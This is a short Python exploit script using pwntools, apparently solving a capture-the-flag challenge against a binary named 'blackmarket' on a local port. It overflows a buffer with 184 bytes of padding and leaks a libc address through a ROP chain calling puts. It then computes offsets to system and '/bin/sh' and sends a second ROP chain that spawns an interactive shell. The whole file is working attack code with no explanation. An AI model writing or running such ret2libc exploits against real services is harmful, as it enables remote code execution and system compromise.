from pwn import *

def exploit():
    p = remote("127.0.0.1", 8888)
    binary = ELF("./blackmarket")
    padding = 184
    poprdi = 0x0000000000401f23
    plt_puts = binary.symbols["plt.puts"]
    got_puts = binary.symbols["got.puts"]
    main = binary.symbols["main"]

    for i in range(5):
        p.sendline("9")

    payload = "A" * padding
    payload += p64(poprdi) + p64(got_puts) + p64(plt_puts) + p64(main)
    p.sendline(payload)
    
    p.recvuntil("Thanks! we will proceed your request :)\n")
    libc_leak = u64(p.recvline()[:-1].ljust(8, "\x00"))
    log.info("Libc leak: {}".format(hex(libc_leak)))
    system_libc = libc_leak - 0x31580
    log.info("System Libc leak: {}".format(hex(system_libc)))
    str_bin_sh = libc_leak + 0x1334da
    log.info("/bin/sh libc leak: {}".format(hex(str_bin_sh)))

    payload = "A" * padding
    payload += p64(poprdi)
    payload += p64(str_bin_sh)
    payload += p64(system_libc)
    payload += "JUNK" * 2
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()